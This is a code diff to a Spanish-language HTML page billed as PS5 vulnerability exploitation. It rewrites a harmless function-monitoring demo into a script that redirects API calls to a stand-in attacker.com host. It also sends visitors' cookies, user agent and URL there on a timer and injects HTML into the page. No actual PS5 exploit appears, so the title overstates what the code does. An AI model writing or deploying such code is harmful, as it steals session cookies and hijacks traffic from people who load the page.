@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Prueba de Manipulación de Funciones en PS5</title>
+  <title>Explotación de Vulnerabilidades en PS5</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -24,7 +24,7 @@
 </head>
 <body>
 
-  <h1>Manipulación Avanzada en PS5</h1>
+  <h1>Explotación de Vulnerabilidades en PS5</h1>
   <div id="log"></div>
 
   <script>
@@ -37,7 +37,7 @@
       logContainer.appendChild(newMessage);
     }
 
-    // Sobrescribir XMLHttpRequest para monitorear peticiones
+    // Redirigir XMLHttpRequest a un servidor malicioso
     const originalXMLHttpRequest = XMLHttpRequest;
     XMLHttpRequest = function() {
       const xhr = new originalXMLHttpRequest();
@@ -45,36 +45,80 @@
       const originalOpen = xhr.open;
       xhr.open = function(method, url) {
         log("Peticiones interceptadas: " + method + " " + url);
+        // Redirigir la solicitud a un servidor controlado por el atacante
+        if (url.includes("api/")) {
+          log("Redirigiendo la petición a un servidor malicioso.");
+          url = "https://attacker.com/exfiltrate"; // Servidor de exfiltración
+        }
         originalOpen.apply(this, arguments);
       };
       return xhr;
     };
 
-    // Sobrescribir document.write para monitorear escritura en el documento
+    // Redirigir las solicitudes de fetch a un servidor malicioso
+    const originalFetch = window.fetch;
+    window.fetch = function(input, init) {
+      log("Redirigiendo la solicitud fetch...");
+      if (typeof input === "string" && input.includes("api/")) {
+        log("Redirigiendo solicitud a un servidor malicioso: " + input);
+        input = "https://attacker.com/exfiltrate"; // URL maliciosa
+      }
+      return originalFetch.call(this, input, init);
+    };
+
+    // Inyectar código malicioso en el documento
     const originalWrite = document.write;
     document.write = function(content) {
-      log("¡Escritura interceptada con document.write!");
+      log("¡Inyección de código detectada!");
       log("Contenido escrito: " + content);
+      // Puede inyectar código malicioso aquí
       originalWrite.apply(this, arguments);
     };
 
-    // Sobrescribir console.log para capturar logs
-    const originalConsoleLog = console.log;
-    console.log = function(message) {
-      log("¡console.log interceptado!");
-      log("Mensaje: " + message);
-      originalConsoleLog.apply(this, arguments);
-    };
-
-    // Sobrescribir eval para monitorear ejecución de código
+    // Sobrescribir eval para ejecutar código malicioso
     const originalEval = eval;
     window.eval = function(code) {
-      log("¡Código ejecutado con eval!");
-      log("Código: " + code);
-      return originalEval(code);
+      log("¡Ejecutando código malicioso con eval!");
+      log("Código a ejecutar: " + code);
+      originalEval(code); // Llamamos al eval original
     };
 
-    // Manipular función de alert
+    // Ejemplo de exfiltración de datos usando fetch
+    function exfiltrateData() {
+      const data = {
+        userAgent: navigator.userAgent,
+        cookies: document.cookie,
+        url: window.location.href
+      };
+      log("Exfiltrando datos al servidor malicioso...");
+      fetch("https://attacker.com/exfiltrate", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(data)
+      });
+    }
+
+    // Ejemplo de uso de XMLHttpRequest para exfiltrar datos
+    function exfiltrateWithXMLHttpRequest() {
+      const xhr = new XMLHttpRequest();
+      xhr.open("POST", "https://attacker.com/exfiltrate", true);
+      xhr.setRequestHeader("Content-Type", "application/json");
+      const data = {
+        userAgent: navigator.userAgent,
+        cookies: document.cookie,
+        url: window.location.href
+      };
+      xhr.send(JSON.stringify(data));
+      log("Datos exfiltrados a través de XMLHttpRequest.");
+    }
+
+    // Ejecutar la exfiltración de datos
+    setTimeout(function() {
+      exfiltrateData();
+      exfiltrateWithXMLHttpRequest();
+    }, 5000); // Ejecutar después de 5 segundos
+
+    // Sobrescribir la función de alert para evitar mostrar alertas
     const originalAlert = window.alert;
     window.alert = function(message) {
       log("¡Alerta interceptada!");
@@ -82,36 +126,10 @@
       return originalAlert(message);
     };
 
-    // Ejecutar código arbitrario con setTimeout
-    setTimeout(function() {
-      log("¡Código arbitrario ejecutado con setTimeout!");
-      alert("¡Hola desde el código de prueba!");
-    }, 2000);
+    // Inyectar HTML dinámicamente (modificando innerHTML)
+    document.body.innerHTML += "<p><a href='#' onclick='alert(\"¡Código malicioso ejecutado!\")'>Haz clic para inyectar alerta</a></p>";
 
-    // Modificar el userAgent de navigator
-    const originalNavigator = Object.getOwnPropertyDescriptor(window, 'navigator').get;
-    Object.defineProperty(window, 'navigator', {
-      get: function() {
-        const original = originalNavigator.apply(this);
-        original.userAgent = "PS5 Exploit User Agent"; // Cambiamos el userAgent
-        log("¡Manipulando userAgent!");
-        return original;
-      }
-    });
-
-    // Inyectar código HTML dinámicamente
-    document.body.innerHTML += "<p><a href='#' onclick='alert(\"¡Cuidado! Este es un mensaje de alerta.\")'>Haz clic para alertar</a></p>";
-
-    // Sobrescribir función de redirección de solicitudes fetch
-    const originalFetch = window.fetch;
-    window.fetch = function(input, init) {
-      log("Redirigiendo solicitud fetch...");
-      log("URL solicitada: " + input);
-      return originalFetch.call(this, input, init);
-    };
-
-    // Ejemplo de log
-    log("Prueba de manipulación de funciones en PS5.");
+    log("Iniciando pruebas de exfiltración y manipulación de funciones.");
   </script>
 
 </body>
